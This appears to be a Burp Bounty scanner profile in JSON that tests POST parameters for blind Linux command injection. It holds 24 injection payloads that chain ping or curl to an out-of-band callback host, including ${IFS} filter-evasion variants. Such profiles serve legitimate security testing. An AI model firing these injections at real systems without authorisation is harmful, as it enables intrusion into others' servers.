[
  {
    "ProfileName": "Blind_RCE_Linux_POSTParams",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@burpbounty",
    "Payloads": [
      "true, |ping -c 2 {BC}",
      "true, ||ping -c 2 {BC}",
      "true, ;ping -c 2 {BC}",
      "true, \u0026\u0026ping -c 2 {BC}",
      "true, \u0026ping -c 2 {BC}",
      "true, %0aping -c 2 {BC}",
      "true, `ping -c 2 {BC}`",
      "true, $(ping -c 2 {BC})",
      "true, \u0026ping${IFS}-c2${IFS}{BC}",
      "true, ;ping${IFS}-c2${IFS}{BC}",
      "true, |ping${IFS}-c2${IFS}{BC}",
      "true, ||ping${IFS}-c2${IFS}{BC}",
      "true, \u0026\u0026ping${IFS}-c2${IFS}{BC}",
      "true, %0aping${IFS}-c2${IFS}{BC}",
      "true, `ping${IFS}-c2${IFS}{BC}`",
      "true, $(ping${IFS}-c2${IFS}{BC})",
      "true, \u0026curl${IFS}{BC}",
      "true, ;curl${IFS}{BC}",
      "true, |curl${IFS}{BC}",
      "true, ||curl${IFS}{BC}",
      "true, \u0026\u0026curl${IFS}{BC}",
      "true, %0acurl${IFS}{BC}",
      "true, `curl${IFS}{BC}`",
      "true, $(curl${IFS}{BC})"
    ],
    "Encoder": [],
    "UrlEncode": true,
    "CharsToUrlEncode": "\u0026",
    "Grep": [],
    "Tags": [
      "All",
      "RCE",
      "All POST Parameters"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "isHeaderValue": false,
    "sequence": false,
    "NewHeaders": [],
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 0,
    "MaxRedir": 0,
    "requestType": 1,
    "rawRequest": "",
    "payloadPosition": 2,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "Blind_RCE_Linux_POSTParams",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "\n\n\u003cbr/\u003e\u003cbr/\u003e- PAYLOAD: \u003cbr/\u003e\u003cpayload\u003e\n\u003cbr/\u003e\u003cbr/\u003e\n- GREP: \u003cbr/\u003e\u003cgrep\u003e",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      1
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false,
    "changeHttpRequest": false,
    "showIssue": false,
    "changeHttpRequestType": 1
  }
]